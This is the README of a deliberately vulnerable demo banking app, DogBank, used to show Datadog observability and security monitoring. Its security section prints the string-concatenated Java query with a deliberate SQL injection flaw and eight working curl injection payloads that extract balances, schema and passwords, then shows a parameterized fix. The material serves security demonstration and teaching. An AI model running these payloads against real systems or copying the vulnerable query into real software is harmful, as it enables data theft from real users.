# 🐕 DogBank - Demo Banking Application

<p align="center">
  <img src="https://img.shields.io/badge/Java-21-orange?style=for-the-badge&logo=openjdk" alt="Java 21">
  <img src="https://img.shields.io/badge/Spring_Boot-3.2-green?style=for-the-badge&logo=spring" alt="Spring Boot">
  <img src="https://img.shields.io/badge/React-18-blue?style=for-the-badge&logo=react" alt="React">
  <img src="https://img.shields.io/badge/PostgreSQL-15-blue?style=for-the-badge&logo=postgresql" alt="PostgreSQL">
  <img src="https://img.shields.io/badge/Docker-Compose-blue?style=for-the-badge&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Datadog-APM-purple?style=for-the-badge&logo=datadog" alt="Datadog">
</p>

DogBank is a **demo banking application** designed for demonstrating observability, security testing, and microservices architecture. It includes intentional vulnerabilities for security demonstrations and is fully instrumented with Datadog APM.

---

## 📁 Repository Structure

```
.
├── instrumented/docker/          # 🔍 Version WITH Datadog APM instrumentation
│   ├── dogbank/                  # Backend microservices (Java/Spring Boot)
│   └── dogbank-frontend/         # Frontend (React)
│
├── non-instrumented/docker/      # 🚫 Version WITHOUT Datadog (for local dev)
│   ├── dogbank/                  # Backend microservices (Java/Spring Boot)
│   └── dogbank-frontend/         # Frontend (React)
│
└── README.md                     # This file
```

---

## 🚀 Quick Start

### Prerequisites

- Docker & Docker Compose
- Git
- (For instrumented version) Datadog API Key

### Option 1: Non-Instrumented Version (No Datadog)

```bash
# Clone the repository
git clone https://github.com/schawirin/Dogbank.git
cd Dogbank/non-instrumented/docker/dogbank

# Start all services
docker-compose up -d --build

# Wait for services to be healthy (about 2-3 minutes)
docker-compose ps

# Access the application
open http://localhost
```

### Option 2: Instrumented Version (With Datadog APM)

```bash
# Clone the repository
git clone https://github.com/schawirin/Dogbank.git
cd Dogbank/instrumented/docker/dogbank

# Set your Datadog API Key
export DD_API_KEY="your-datadog-api-key-here"

# Start all services
docker-compose -f docker-compose.full.yml up -d --build

# Wait for services to be healthy (about 2-3 minutes)
docker-compose -f docker-compose.full.yml ps

# Access the application
open http://localhost
```

---

## 🔐 Test Users (All Users)

| # | Name | CPF | Password | Balance | Bank | PIX Key | Account |
|---|------|-----|----------|---------|------|---------|---------|
| 1 | Vitoria Itadori | 12345678915 | 123456 | R$ 10,000.00 | DOG BANK | vitoria.itadori@dogbank.com | 0001-9 |
| 2 | Pedro Silva | 98765432101 | 123456 | R$ 15,000.00 | Banco do Brasil | pedro.silva@dogbank.com | 0002-1 |
| 3 | João Santos | 45678912302 | 123456 | R$ 8,500.00 | Itaú | joao.santos@dogbank.com | 0003-2 |
| 4 | Emiliano Costa | 78912345603 | 123456 | R$ 12,000.00 | Santander | emiliano.costa@dogbank.com | 0004-3 |
| 5 | Eliane Oliveira | 32165498704 | 123456 | R$ 9,500.00 | Bradesco | eliane.oliveira@dogbank.com | 0005-4 |
| 6 | Patrícia Souza | 65498732105 | 123456 | R$ 20,000.00 | Nubank | patricia.souza@dogbank.com | 0006-5 |
| 7 | Renato Almeida | 15975385206 | 123456 | R$ 7,500.00 | DOG BANK | renato.almeida@dogbank.com | 0007-6 |
| 8 | Usuário Teste | 66666666666 | 123456 | R$ 50,000.00 | DOG BANK | teste@dogbank.com | 0008-7 |

> **Note**: All users have the same password: `123456`

---

## 🧪 Demo Scenarios

### 1. ✅ Successful PIX Transfer

1. Login with CPF `66666666666` and password `123456`
2. Click on "PIX" in the sidebar
3. Enter PIX key: `pedro.silva@dogbank.com`
4. Enter amount: `100`
5. Confirm with password `123456`
6. ✅ Transaction should complete successfully

### 2. ❌ Expected Error: Invalid PIX Key

1. Login with any user
2. Go to PIX transfer
3. Enter an invalid PIX key: `invalid@email.com`
4. ❌ **Error**: "Chave PIX não encontrada no sistema"

### 3. ❌ Expected Error: Insufficient Balance

1. Login with CPF `15975385206` (Renato Almeida - R$ 7,500)
2. Try to transfer R$ 10,000 to any valid PIX key
3. ❌ **Error**: "Saldo insuficiente"

### 4. ❌ Expected Error: Transfer to Self

1. Login with CPF `66666666666`
2. Try to transfer to `teste@dogbank.com` (same user)
3. ❌ **Error**: "Não é possível transferir para si mesmo"

### 5. ⏱️ Expected Error: Timeout (Banco Central)

1. Login with any user
2. Transfer exactly R$ 100.00 to any valid PIX key
3. ⏱️ **Error**: Timeout from Banco Central (simulated delay)

### 6. 🚫 Expected Error: Limit Exceeded

1. Login with any user
2. Transfer exactly R$ 1,000.00 to any valid PIX key
3. 🚫 **Error**: "Limite de transação excedido"

---

## 🔓 Security Vulnerabilities (For Demo)

> ⚠️ **WARNING**: These vulnerabilities are intentional for security demonstrations. Never use this code in production!

### SQL Injection Vulnerability

**Endpoint**: `GET /api/transactions/validate-pix-key?pixKey=...`

**Vulnerable Code** (TransactionService.java line 259-262):
```java
String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
             "FROM usuarios u " +
             "JOIN contas c ON u.id = c.usuario_id " +
             "WHERE u.chave_pix = '" + pixKey + "'";  // ⚠️ VULNERABLE!
```

### What Data Can Be Extracted?

The vulnerable endpoint returns these fields from the database:
- **nome** - User's full name
- **email** - User's email address
- **cpf** - User's CPF (Brazilian ID number)
- **saldo** - Account balance 💰
- **banco** - Bank name
- **chave_pix** - PIX key

---

### 🔴 SQL Injection Attack Examples

#### 1. Basic Injection - Bypass Authentication (Returns First User)
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR '1'='1"
```

**Expected Response:**
```json
{
  "valid": true,
  "nome": "Vitoria Itadori",
  "email": "vitoria.itadori@dogbank.com",
  "cpf": "***.***.***-15",
  "saldo": "R$ 10000.00",
  "banco": "DOG BANK",
  "chave_pix": "vitoria.itadori@dogbank.com"
}
```

---

#### 2. Extract Account Balance of a Specific User 💰
```bash
# Get Pedro Silva's balance
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR email='pedro.silva@dogbank.com'--"
```

**Expected Response:**
```json
{
  "valid": true,
  "nome": "Pedro Silva",
  "saldo": "R$ 15000.00",
  "banco": "Banco do Brasil"
}
```

---

#### 3. Extract ALL Users and Their Balances (UNION Attack)
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, cpf, saldo::text, banco, chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id LIMIT 1 OFFSET 0--"
```

Change `OFFSET 0` to `OFFSET 1`, `OFFSET 2`, etc. to iterate through all users.

---

#### 4. Extract User with Highest Balance
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT u.nome, u.email, u.cpf, c.saldo::text, c.banco, u.chave_pix FROM usuarios u JOIN contas c ON u.id = c.usuario_id ORDER BY c.saldo DESC LIMIT 1--"
```

**Expected Response:**
```json
{
  "valid": true,
  "nome": "Usuário Teste",
  "saldo": "R$ 50000.00",
  "banco": "DOG BANK"
}
```

---

#### 5. Extract Database Table Names
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT table_name, null, null, null, null, null FROM information_schema.tables WHERE table_schema='public'--"
```

**Expected Response (iterating):**
- `usuarios`
- `contas`
- `transacoes_pix`

---

#### 6. Extract Column Names from `contas` Table
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT column_name, data_type, null, null, null, null FROM information_schema.columns WHERE table_name='contas'--"
```

**Columns in `contas` table:**
- `id` - Account ID
- `usuario_id` - User ID (foreign key)
- `numero_conta` - Account number
- `saldo` - Balance 💰
- `banco` - Bank name
- `user_name` - Account holder name
- `criado_em` - Creation date

---

#### 7. Extract All Account Numbers and Balances
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT numero_conta, user_name, saldo::text, banco, null, null FROM contas LIMIT 1 OFFSET 0--"
```

---

#### 8. Extract User Passwords (if stored in plain text)
```bash
curl "http://localhost/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, senha, cpf, null, null FROM usuarios LIMIT 1--"
```

---

### 📊 Where to See the Attack in Datadog

1. **APM Traces** (`https://app.datadoghq.com/apm/traces`)
   - Search for `service:transaction-service`
   - Look for traces with `resource_name:/api/transactions/validate-pix-key`
   - Click on a trace to see the **SQL query with injected payload**

2. **Logs** (`https://app.datadoghq.com/logs`)
   - Filter: `service:transaction-service @message:*SQL*`
   - You'll see logs like: `📝 [SQL QUERY]: SELECT ... WHERE u.chave_pix = '' OR '1'='1'`

3. **Security Signals** (`https://app.datadoghq.com/security`)
   - ASM will detect SQL injection patterns
   - Look for alerts with `attack_type:sql_injection`

4. **Error Tracking** (`https://app.datadoghq.com/apm/error-tracking`)
   - Malformed SQL injections will cause errors
   - You can see the full stack trace and query

---

### 🛡️ How to Fix (For Reference)

The secure way to write this query:

```java
// ✅ SECURE - Using parameterized queries
String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
             "FROM usuarios u " +
             "JOIN contas c ON u.id = c.usuario_id " +
             "WHERE u.chave_pix = :pixKey";

Query query = entityManager.createNativeQuery(sql);
query.setParameter("pixKey", pixKey);  // Safe!
```

---

## 🏗️ Tech Stack

### Backend (Microservices)

| Service | Technology | Port | Description |
|---------|------------|------|-------------|
| auth-service | Java 21 + Spring Boot 3.2 | 8086 | User authentication & management |
| account-service | Java 21 + Spring Boot 3.2 | 8089 | Account management |
| transaction-service | Java 21 + Spring Boot 3.2 | 8087 | PIX transactions |
| bancocentral-service | Java 21 + Spring Boot 3.2 | 8085 | PIX validation (mock Banco Central) |

### Frontend

| Technology | Version | Description |
|------------|---------|-------------|
| React | 18.x | UI Framework |
| Vite | 5.x | Build tool |
| TailwindCSS | 3.x | Styling |
| Axios | 1.x | HTTP client |
| React Router | 6.x | Routing |

### Infrastructure

| Technology | Version | Description |
|------------|---------|-------------|
| PostgreSQL | 15 | Primary database |
| Redis | 7 | Cache layer |
| Nginx | Alpine | Reverse proxy & API gateway |
| Docker Compose | 3.8 | Container orchestration |

### Observability (Instrumented Version Only)

| Technology | Description |
|------------|-------------|
| Datadog Agent | Metrics, logs, and APM collection |
| Datadog APM | Distributed tracing |
| Datadog RUM | Real User Monitoring (frontend) |
| Datadog ASM | Application Security Monitoring |
| dd-trace-java | Java APM instrumentation |

---

## 🔄 Git Flow

We follow a simplified Git Flow workflow:

```
main (production)
  │
  ├── develop (integration)
  │     │
  │     ├── feature/xxx (new features)
  │     ├── bugfix/xxx (bug fixes)
  │     └── hotfix/xxx (urgent fixes)
  │
  └── release/x.x.x (release candidates)
```

### Branch Naming Convention

| Type | Pattern | Example |
|------|---------|---------|
| Feature | `feature/description` | `feature/add-pix-qrcode` |
| Bug Fix | `bugfix/description` | `bugfix/fix-balance-calculation` |
| Hot Fix | `hotfix/description` | `hotfix/security-patch` |
| Release | `release/version` | `release/1.2.0` |

### Commit Message Convention

```
type(scope): description

[optional body]

[optional footer]
```

**Types**: `feat`, `fix`, `docs`, `style`, `refactor`, `test`, `chore`

**Examples**:
```
feat(pix): add QR code generation for PIX transfers
fix(auth): resolve session timeout issue
docs(readme): update installation instructions
```

---

## 📊 API Endpoints

### Authentication (`/api/auth`)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/login` | User login |
| POST | `/api/auth/validate-password` | Validate transaction password |
| GET | `/api/auth/pix-key/{pixKey}` | Get user by PIX key |

### Accounts (`/api/accounts`)

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/accounts/cpf/{cpf}` | Get account by CPF |
| GET | `/api/accounts/{id}` | Get account by ID |
| GET | `/api/accounts/{id}/balance` | Get account balance |

### Transactions (`/api/transactions`)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/transactions/pix` | Execute PIX transfer |
| GET | `/api/transactions/account/{accountId}` | Get transaction history |
| GET | `/api/transactions/validate-pix-key` | Validate PIX key (⚠️ **Vulnerable to SQL Injection**) |

### Banco Central (`/api/bancocentral`)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/bancocentral/pix/validate` | Validate PIX transaction |

---

## 🛠️ Development

### Running Locally (Without Docker)

```bash
# Backend (each service)
cd instrumented/docker/dogbank/auth-module
./mvnw spring-boot:run

# Frontend
cd instrumented/docker/dogbank-frontend
npm install
npm run dev
```

### Building Docker Images

```bash
# Build all services
cd instrumented/docker/dogbank
docker-compose -f docker-compose.full.yml build

# Build specific service
docker-compose -f docker-compose.full.yml build auth-service
```

### Viewing Logs

```bash
# All services
docker-compose -f docker-compose.full.yml logs -f

# Specific service
docker-compose -f docker-compose.full.yml logs -f transaction-service

# Filter for errors
docker-compose -f docker-compose.full.yml logs transaction-service 2>&1 | grep -E "ERROR|Exception"
```

### Database Access

```bash
# Connect to PostgreSQL
docker exec -it dogbank-postgres psql -U dogbank -d dogbank

# View all users with balances
SELECT u.nome, u.cpf, u.chave_pix, c.saldo, c.banco 
FROM usuarios u 
JOIN contas c ON u.id = c.usuario_id 
ORDER BY c.saldo DESC;

# View transactions
SELECT * FROM transacoes_pix ORDER BY data_transacao DESC;

# Check specific user balance
SELECT u.nome, c.saldo FROM usuarios u 
JOIN contas c ON u.id = c.usuario_id 
WHERE u.chave_pix = 'teste@dogbank.com';
```

---

## 📱 Application Pages

| Page | URL | Description |
|------|-----|-------------|
| Landing | `/` | Welcome page |
| Login | `/login` | User authentication |
| Dashboard | `/dashboard` | Main dashboard with balance and quick actions |
| PIX Transfer | `/dashboard/pix` | Start a new PIX transfer |
| PIX Confirm | `/dashboard/pix/confirm` | Confirm PIX transfer details |
| PIX Receipt | `/dashboard/pix/receipt` | Transaction receipt |
| Statement | `/dashboard/extrato` | Transaction history |
| Cards | `/dashboard/cartoes` | Credit card management |
| Profile | `/dashboard/perfil` | User profile with credit score |

---

## 🧹 Cleanup

```bash
# Stop all services
docker-compose -f docker-compose.full.yml down

# Stop and remove volumes (delete all data)
docker-compose -f docker-compose.full.yml down -v

# Remove all DogBank images
docker images | grep dogbank | awk '{print $3}' | xargs docker rmi -f

# Clean up everything
docker system prune -af
```

---

## 📝 License

This project is for **demonstration purposes only**. Do not use in production environments.

---

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📧 Support

For questions or issues, please open a GitHub issue.
